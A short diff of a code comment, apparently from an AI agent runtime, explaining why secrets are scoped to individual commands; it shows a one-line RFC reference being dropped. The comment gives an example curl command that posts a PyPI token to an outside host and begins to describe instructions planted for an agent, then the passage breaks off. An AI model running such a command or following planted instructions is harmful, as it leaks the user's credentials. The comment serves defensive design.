@@ -1,5 +1,5 @@
 /**
- * Which of an agent's secrets one command receives (S6, RFC_SCOPED_EXEC_SECRETS).
+ * Which of an agent's secrets one command receives.
  *
  * `exec_secrets` handed every named secret to every command an agent ran. Masking kept the values out of what came
  * back; nothing kept them in: `curl https://elsewhere -d "$PYPI_TOKEN"` sent one out, and an instruction planted in a
